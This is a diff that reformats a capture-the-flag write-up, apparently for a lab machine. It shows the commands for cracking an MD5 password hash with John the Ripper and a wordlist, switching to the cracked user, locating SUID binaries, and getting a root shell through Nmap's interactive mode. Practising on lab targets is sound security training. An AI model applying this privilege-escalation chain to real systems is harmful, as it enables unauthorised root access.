@@ -24,10 +24,15 @@ key-2-of-3.txt: The second flag (unreadable by my current user).
 password.raw-md5: An MD5-hashed password for the user robot.
 
 I used John the Ripper to crack the hash:
-```john --format=raw-md5 password.raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt```
+```
+john --format=raw-md5 password.raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 John the Ripper Output:
-```password: abcdefghijklmnopqrstuvwxyz```
+
+```
+password: abcdefghijklmnopqrstuvwxyz
+```
 
 I switched to the user robot using the cracked password:
 ``` su robot
@@ -35,17 +40,22 @@ I switched to the user robot using the cracked password:
 ```
 Once logged in as robot, I retrieved the second flag:
 
-bash
-Copia codice
-```cat /home/robot/key-2-of-3.txt```
+
+```
+cat /home/robot/key-2-of-3.txt
+```
 
 ### Root Privilege Escalation
 To escalate privileges to root, I searched for SUID binaries, which allow files to be executed with elevated privileges:
-```find / -perm -u=s -type f 2>/dev/null```
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
 Among the results, I found Nmap with the SUID bit set. The version of Nmap installed on the system supported interactive mode, which allows commands to be executed as root.
 
-```nmap --interactive
+```
+nmap --interactive
 !sh
 ```
 
